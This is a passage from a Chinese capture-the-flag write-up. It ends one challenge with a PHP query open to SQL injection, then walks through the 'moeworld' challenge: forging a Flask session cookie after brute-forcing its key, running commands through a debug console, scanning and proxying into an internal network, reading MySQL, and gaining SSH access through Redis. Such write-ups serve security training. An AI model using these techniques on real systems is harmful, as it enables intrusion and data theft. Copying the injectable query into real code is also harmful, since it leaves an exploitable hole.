$query = "INSERT INTO visitor_records (ip, user_agent, time) VALUES ('$ip', '$user_agent', $time)";

// 执行插入
$result = mysqli_query($mysqli, $query);

// 检查插入是否成功
if ($result) {
    echo '数据插入成功';
} else {
    echo '数据插入失败: ' . mysqli_error($mysqli);
}

// 关闭数据库连接
mysqli_close($mysqli);

//gpt真好用
数据插入失败: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ')' at line 1
```

报错注入即可获得flag

~~彩蛋在题目源码里~~

## moeworld

by xlccccc

本题需要完成前置题目 `出去旅游的心海` 才可以解开题目内容的压缩包

### flag1

给了一个可访问的http服务，有登录框但是可注册，所以一般是先注册进去看看里面有什么内容

发现是一个留言板服务，且在admin的留言里泄露了密钥

```python
app.secret_key = "This-random-secretKey-you-can't-get" + os.urandom(2).hex()
```

可能这里的密钥明文部分产生了迷惑吧❓有人觉得这个字符串是未公开的，这里是假的，其实就是爆破。。。

先生成个字典

```python
import itertools
characters = 'abcdef0123456789'
combinations = itertools.product(characters, repeat=4)

all_combinations = [''.join(combo) for combo in combinations]

prefixed_combinations = ['This-random-secretKey-you-can\'t-get' + combo for combo in all_combinations]

with open('1.txt', 'w') as file:
    for combo in prefixed_combinations:
        file.write(combo + '\n')
```

然后用`flask-unsign`爆破

```bash
flask-unsign --unsign --cookie "eyJwb3dlciI6Imd1ZXN0IiwidXNlciI6IjEyMyJ9.ZTjZ6A.5y2z2ihdj3LiH2YkMjCBQm2XS9A" --wordlist 1.txt --no-literal-eval
```

![Untitled](moeworld%20f27872f0066f4f15ac06538ed5b01b72/Untitled.png)

```python
This-random-secretKey-you-can't-get0a62
```

解密

```bash
flask-unsign --decode --cookie 'eyJwb3dlciI6Imd1ZXN0IiwidXNlciI6IjEyMyJ9.ZTjZ6A.5y2z2ihdj3LiH2YkMjCBQm2XS9A'
```

伪造

```bash
flask-unsign --sign --cookie "{'power': 'admin', 'user': '123'}" --secret "This-random-secretKey-you-can't-get0a62" --no-literal-eval
# eyJwb3dlciI6ImFkbWluIiwidXNlciI6IjEyMyJ9.ZTjahQ.dGbhvXHmZKt9BUAsFYc2npiHxpw
```

利用伪造后的cookie访问后发现了新的留言

![Untitled](moeworld%20f27872f0066f4f15ac06538ed5b01b72/Untitled%201.png)

拿到pin码之后进console执行任意命令

这里可以拿到flag1

![Untitled](moeworld%20f27872f0066f4f15ac06538ed5b01b72/Untitled%202.png)

### flag2

这里根目录下有个readme，也有提示

![Untitled](moeworld%20f27872f0066f4f15ac06538ed5b01b72/Untitled%203.png)

提示你使用fscan扫描，这里虽然没有`ifconfig`命令，但是可以`cat /etc/hosts`，也有好多人不知道这一点

（一堆人扫公网服务器被阿里云警告烂了）

![Untitled](moeworld%20f27872f0066f4f15ac06538ed5b01b72/Untitled%204.png)

有两个网段很明显一个内网一个外网

![Untitled](moeworld%20f27872f0066f4f15ac06538ed5b01b72/Untitled%205.png)

扫到内网端口后就可以打开另一个压缩包了

```
password
22-3306-6379-8080

当你看到此部分，证明你正确的进行了fscan的操作得到了正确的结果
可以看到，在本内网下还有另外两台服务器
其中一台开启了22(ssh)和6379(redis)端口
另一台开启了3306(mysql)端口
还有一台正是你访问到的留言板服务
接下来，你可能需要搭建代理，从而使你的本机能直接访问到内网的服务器
此处可了解`nps`和`frp`，同样在/app/tools已内置了相应文件
连接代理，推荐`proxychains`
对于mysql服务器，你需要找到其账号密码并成功连接，在数据库中找到flag2
对于redis服务器，你可以学习其相关的渗透技巧，从而获取到redis的权限，并进一步寻找其getshell的方式，最终得到flag3
```

这里也说的很明显了，搭代理然后访问数据库以及打redis

tools文件夹下给出了一个frpc.ini，但是没权限编辑，是做示范了，有巨多人问我改不了怎么办…

去/tmp目录下写一个不就好了

搭代理的过程就不展示了

这里用proxychains连上代理

![Untitled](moeworld%20f27872f0066f4f15ac06538ed5b01b72/Untitled%206.png)

然后连接mysql

```bash
proxychains mysql -h 172.20.0.2 -u root -p
```

密码在python靶机内有（python连的mysql，所以肯定有密码）

![Untitled](moeworld%20f27872f0066f4f15ac06538ed5b01b72/Untitled%207.png)

![Untitled](moeworld%20f27872f0066f4f15ac06538ed5b01b72/Untitled%208.png)

### flag3

开了22和6379，很明显就redis写ssh公钥rce了

这里直接用`proxifier`代理`172.20.0.*`的流量

![Untitled](moeworld%20f27872f0066f4f15ac06538ed5b01b72/Untitled%209.png)

然后利用工具直接写入公钥

![Untitled](moeworld%20f27872f0066f4f15ac06538ed5b01b72/Untitled%2010.png)

然后拿着私钥ssh直接连就好了

![Untitled](moeworld%20f27872f0066f4f15ac06538ed5b01b72/Untitled%2011.png)

工具是

[https://github.com/SafeGroceryStore/MDUT](https://github.com/SafeGroceryStore/MDUT)

利用proxychains然后手写也是一样的，也很简单

-----

结束    
